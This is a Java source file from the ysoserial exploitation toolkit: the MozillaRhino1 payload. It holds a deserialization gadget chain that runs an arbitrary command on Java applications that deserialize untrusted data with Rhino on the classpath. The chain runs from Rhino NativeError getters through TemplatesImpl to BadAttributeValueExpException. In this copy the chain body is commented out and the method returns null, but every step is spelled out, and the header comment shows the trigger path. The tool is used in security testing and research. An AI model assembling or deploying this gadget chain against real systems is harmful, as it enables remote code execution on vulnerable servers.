package ysoserial.payloads;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.mozilla.javascript.*;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.annotation.PayloadTest;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.JavaVersion;
import ysoserial.payloads.util.PayloadRunner;

import javax.management.BadAttributeValueExpException;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;

/*
    by @matthias_kaiser
*/
@SuppressWarnings({"rawtypes", "unchecked"})
/**
 * org.mozilla.javascript.WrappedException: Wrapped java.lang.NullPointerException
 * 	at org.mozilla.javascript.Context.throwAsScriptRuntimeEx(Context.java:1773)
 * 	at org.mozilla.javascript.MemberBox.invoke(MemberBox.java:183)
 * 	at org.mozilla.javascript.NativeJavaMethod.call(NativeJavaMethod.java:247)
 * 	at org.mozilla.javascript.ScriptableObject.getImpl(ScriptableObject.java:2024)
 * 	at org.mozilla.javascript.ScriptableObject.get(ScriptableObject.java:287)
 * 	at org.mozilla.javascript.IdScriptableObject.get(IdScriptableObject.java:387)
 * 	at org.mozilla.javascript.ScriptableObject.getProperty(ScriptableObject.java:1617)
 * 	at org.mozilla.javascript.NativeError.getString(NativeError.java:198)
 * 	at org.mozilla.javascript.NativeError.js_toString(NativeError.java:150)
 * 	at org.mozilla.javascript.NativeError.toString(NativeError.java:110)
 * 	at javax.management.BadAttributeValueExpException.readObject(BadAttributeValueExpException.java:86)
 * 	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
 * 	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
 * 	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
 * 	at java.lang.reflect.Method.invoke(Method.java:498)
 * 	at java.io.ObjectStreamClass.invokeReadObject(ObjectStreamClass.java:1158)
 * 	at java.io.ObjectInputStream.readSerialData(ObjectInputStream.java:2173)
 * 	at java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:2064)
 * 	at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1568)
 * 	at java.io.ObjectInputStream.readObject(ObjectInputStream.java:428)
 * 	at ysoserial.Deserializer.deserialize(Deserializer.java:27)
 * 	at ysoserial.Deserializer.deserialize(Deserializer.java:22)
 * 	at ysoserial.payloads.util.PayloadRunner.run(PayloadRunner.java:41)
 * 	at ysoserial.payloads.MozillaRhino1.main(MozillaRhino1.java:69)
 */
@PayloadTest( precondition = "isApplicableJavaVersion")
@Dependencies({"rhino:js:1.7R2"})
@Authors({ Authors.MATTHIASKAISER })
public class MozillaRhino1 implements ObjectPayload<Object> {

    public Object getObject(final String command) throws Exception {

//        Class nativeErrorClass = Class.forName("org.mozilla.javascript.NativeError");
//        Constructor nativeErrorConstructor = nativeErrorClass.getDeclaredConstructor();
//        nativeErrorConstructor.setAccessible(true);
//        IdScriptableObject idScriptableObject = (IdScriptableObject) nativeErrorConstructor.newInstance();
//
//        Context context = Context.enter();
//
//        NativeObject scriptableObject = (NativeObject) context.initStandardObjects();
//
//        Method enterMethod = Context.class.getDeclaredMethod("enter");
//        NativeJavaMethod method = new NativeJavaMethod(enterMethod, "name");
//        idScriptableObject.setGetterOrSetter("name", 0, method, false);
//
//        Method newTransformer = TemplatesImpl.class.getDeclaredMethod("newTransformer");
//        NativeJavaMethod nativeJavaMethod = new NativeJavaMethod(newTransformer, "message");
//        idScriptableObject.setGetterOrSetter("message", 0, nativeJavaMethod, false);
//
//        Method getSlot = ScriptableObject.class.getDeclaredMethod("getSlot", String.class, int.class, int.class);
//        getSlot.setAccessible(true);
//        Object slot = getSlot.invoke(idScriptableObject, "name", 0, 1);
//        Field getter = slot.getClass().getDeclaredField("getter");
//        getter.setAccessible(true);
//
//        Class memberboxClass = Class.forName("org.mozilla.javascript.MemberBox");
//        Constructor memberboxClassConstructor = memberboxClass.getDeclaredConstructor(Method.class);
//        memberboxClassConstructor.setAccessible(true);
//        Object memberboxes = memberboxClassConstructor.newInstance(enterMethod);
//        getter.set(slot, memberboxes);
//
//        NativeJavaObject nativeObject = new NativeJavaObject(scriptableObject, Gadgets.createTemplatesImpl(command), TemplatesImpl.class);
//        idScriptableObject.setPrototype(nativeObject);
//
//        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
//        Field valField = badAttributeValueExpException.getClass().getDeclaredField("val");
//        valField.setAccessible(true);
//        valField.set(badAttributeValueExpException, idScriptableObject);
//
//        return badAttributeValueExpException;
        return null;
    }

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(MozillaRhino1.class, args);
    }

    public static boolean isApplicableJavaVersion() {
        return JavaVersion.isBadAttrValExcReadObj();
    }

}
